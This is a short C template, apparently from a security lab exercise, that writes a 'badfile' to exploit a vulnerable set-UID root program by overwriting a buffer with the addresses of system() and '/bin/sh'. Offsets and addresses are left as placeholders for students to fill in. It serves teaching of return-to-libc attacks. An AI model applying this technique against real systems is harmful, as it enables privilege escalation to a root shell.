/* 
 This program generates the badfile.
 The badfile will be used to exploit the
 vulnerable set-UID root program.
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  // 1. Open badfile
  badfile = fopen("./badfile", "w");

  // 2. Write addresses in buffer 
  // Addresses from Task A and B
  // Distances X and Y from Task C

  *(long *) &buf[X] = <address> ;   //  "/bin/sh" address
  *(long *) &buf[Y] = <address> ;   //  system() address
  
  // 3. Write buffer to badfile
  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
